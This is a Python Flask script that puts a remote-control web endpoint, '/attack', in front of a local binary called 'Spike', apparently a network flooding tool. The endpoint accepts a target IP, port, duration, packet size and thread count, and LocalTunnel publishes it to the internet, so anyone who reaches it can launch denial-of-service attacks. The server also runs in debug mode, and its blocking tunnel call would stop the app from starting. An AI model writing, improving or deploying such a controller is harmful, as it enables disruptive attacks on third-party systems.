import subprocess
import json
from flask import Flask, request, jsonify
import os
import sys

# Flask app initialization
app = Flask(__name__)

# Setup LocalTunnel URL (exposes port 5000 to the internet)
public_url = None

@app.route('/attack', methods=['POST'])
def attack():
    # Extract the payload from the incoming request
    data = request.get_json()

    # Extract parameters from the payload
    ip = data.get("ip")
    port = data.get("port")
    time_duration = data.get("time")
    packet_size = data.get("packet_size")
    threads = data.get("threads")

    # Check if any of the required fields are missing
    if not ip or not port or not time_duration or not packet_size or not threads:
        return jsonify({"error": "Missing required parameters (ip, port, time, packet_size, threads)"}), 400

    # Log the received attack request
    print(f"Received attack request: IP={ip}, Port={port}, Time={time_duration}, Packet Size={packet_size}, Threads={threads}")

    try:
        # Execute the binary (e.g., Spike) with the extracted parameters
        result = subprocess.run(
            ["./Spike", ip, port, time_duration, packet_size, threads],
            capture_output=True, text=True
        )

        # Capture the output and error
        output = result.stdout
        error = result.stderr

        # Check if the command ran successfully
        if result.returncode == 0:
            status = "Attack executed successfully!"
        else:
            status = f"Attack failed: {error}"

        # Respond back with execution results
        return jsonify({
            "status": status,
            "output": output,
            "error": error
        })

    except Exception as e:
        return jsonify({"error": f"Failed to execute binary: {str(e)}"}), 500

if __name__ == '__main__':
    # Expose the server to the public using LocalTunnel
    print("Starting LocalTunnel...")
    os.system("lt --port 5000")  # Run LocalTunnel to expose port 5000
    
    # Running the Flask app to listen for requests
    print("Starting Flask server on port 5000...")
    app.run(port=5000, debug=True)
    